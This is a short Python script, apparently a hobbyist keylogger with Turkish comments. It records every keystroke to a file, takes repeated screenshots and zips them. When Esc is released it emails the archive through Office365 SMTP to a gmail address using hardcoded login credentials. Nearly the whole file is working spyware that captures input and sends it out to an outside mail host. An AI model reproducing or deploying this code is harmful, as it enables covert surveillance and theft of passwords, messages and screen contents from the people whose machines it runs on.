from pynput.keyboard import Key, Listener
import  random
import zipfile as z
import time
import os
import pynput
import  pyautogui
import random
from datetime import datetime
import ssl
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib
from email.utils import formatdate

count = 0
keys = []
zip = z.ZipFile('/Users/muharrem/Desktop/pythonx/myzip.zip', "w")



def on_press(key):
    global keys, count
    keys.append(key)
    count += 1 # count = count + 1
    print("{0} tuşuna basıldı!".format(str(key)))

    if count >= 0:
        write_file(keys)
        keys = []
        count = 0

def write_file(keys):
    with open("/Users/muharrem/Desktop/pythonx/keylog.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key"):
                file.write(str(k))

def on_release(key):
    if key == Key.esc:
        zip.write("/Users/muharrem/Desktop/pythonx/keylog.txt")
        mailAt("muharremyilmaz656@gmail.com")
        print("mail gönderildi")
        return False

def mailAt(gonderilcekMail):
    kullanıcı = "denemecsharp@hotmail.com"
    sifre = "sifrem:)"
    port = 587
    host = "smtp.office365.com"
    context = ssl.create_default_context()
    msg = MIMEMultipart()
    msg['From'] = kullanıcı
    msg['To'] = gonderilcekMail
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = "Başarılı"
    msg.attach(MIMEText("Başarılı"))
    part = MIMEBase('application', "octet-stream")
    #/Users/muharrem/Desktop/pythonx/myzip.zip
    part.set_payload(open('C:\\users\\Muharrem\\Desktop\\pythonx\\myzip.zip', "rb").read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment', filename='C:\\users\\Muharrem\\Desktop\\pythonx\\myzip.zip')
    msg.attach(part)

    smtp = smtplib.SMTP("smtp.office365.com", 587)
    smtp.starttls()
    smtp.login(kullanıcı, sifre)
    smtp.sendmail(msg['From'], msg['To'], msg.as_string())
    smtp.quit()

with Listener(on_press=on_press, on_release=on_release) as listener :
    sayac = 0
    tekrar = True
    while tekrar:
        if sayac != 11:
            ss = pyautogui.screenshot()
            number=   str(random.randint(1, 1000))
       # C:\Users\Muharrem\PycharmProjects\MyKeyV2    /Users/muharrem/Desktop/pythonx/"+a+".png" ,"PNG")
            ss.save("/Users/muharrem/Desktop/pythonx/"+number+".png")
            zip.write("/Users/muharrem/Desktop/pythonx/"+number+".png")
            time.sleep(5.0)
            sayac += 1

        else:
             tekrar = False

    listener.start()


